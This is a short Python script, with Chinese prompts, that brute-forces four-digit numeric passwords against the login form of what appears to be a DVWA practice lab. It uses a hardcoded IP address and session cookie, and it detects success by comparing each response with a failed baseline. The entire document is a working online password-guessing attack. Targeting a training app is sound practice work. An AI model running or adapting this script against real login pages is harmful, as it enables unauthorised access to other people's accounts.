import requests
s='0123456789'
url="http://121.89.208.185:81/vulnerabilities/brute/?"
m=0
n=1
username=input("请输入用户名")
data2={'username':username,'password':00000,'Login':'Login'}
headers={'cookie':'security=low; PHPSESSID=711ce5ff0b53f2c388c15b16bfdc1b84'}
response2=requests.post(url,data2,headers=headers)
text2=response2.text
for a in s:
    if m==1:
        break
    for b in s:
        if m==1:
            break
        for c in s:
            if m==1:
                break
            for d in s:
                if m==1:
                    break
                password=a+b+c+d
                data1={'username':username,'password':password,'Login':'Login'}
                response1=requests.post(url,data1,headers=headers)
                text1=response1.text
                print("\r"+"字典进度为",n,"/",(len(s))**4,end="",flush=True)
                n=n+1
                if (text1!=text2) and len(text1)!=len(text2):
                    print("\n成功！")
                    print("用户名为：",username)
                    print("密码为：",password)
                    m=1
                    break
